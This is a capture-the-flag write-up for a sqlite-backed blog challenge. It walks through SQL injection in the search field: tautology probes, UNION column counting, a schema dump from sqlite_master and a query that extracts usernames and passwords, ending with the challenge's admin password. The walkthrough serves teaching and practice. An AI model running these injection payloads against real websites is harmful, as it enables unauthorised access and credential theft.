Blog
==============

Get the admin password from this website (link).

Hints:
 - Not much you can do except search
 - Explore the database
 - The blog is using sqlite

Writeup
--------------

The website is just a very simple blog site with a search function.
Nothing too interesting to note there.

This is a web challenge, so the first thing to do is to try an SQL
injection.

We can confirm that the web app is vulnerable by searching `'OR 1=1; --`
and observing that this matches all articles, but `'AND 1=0; --` matches
no articles.  So, we can imagine the query looks something like:

    query = "SELECT * FROM articles WHERE title LIKE '%" + search + "%';"

One of the hints is to explore the database, and that the database in
question is an SQL database.  So, let's see how many fields the database
is querying.  Trying the following payloads:

    ' UNION ALL SELECT 1; -- [HTTP 500 ISE]
    ' UNION ALL SELECT 1,2; -- [HTTP 500 ISE]
    ' UNION ALL SELECT 1,2,3; -- [HTTP 200 OK]

On the last query, you can see that you successfully inserted a row into
the result.  The schema for each table in a sqlite database is stored in
the `sql` row of the `sqlite_master` table.  Let's take a look, shall we?

    ' AND 1=0 UNION ALL SELECT sql,'','' FROM sqlite_master; --

The page shows us the database schema:

    CREATE TABLE posts (title text, contents text, date text)
    CREATE TABLE comments (contents text, author text)
    CREATE TABLE secret_users (username text, password text)

Well, the secret_users seems suspicious.  Let's take a look in there:

    ' AND 1=0 UNION ALL SELECT username,password,'' FROM secret_users; --

And the response gives us the key:

    admin: p0uatl0et3ubsw2r
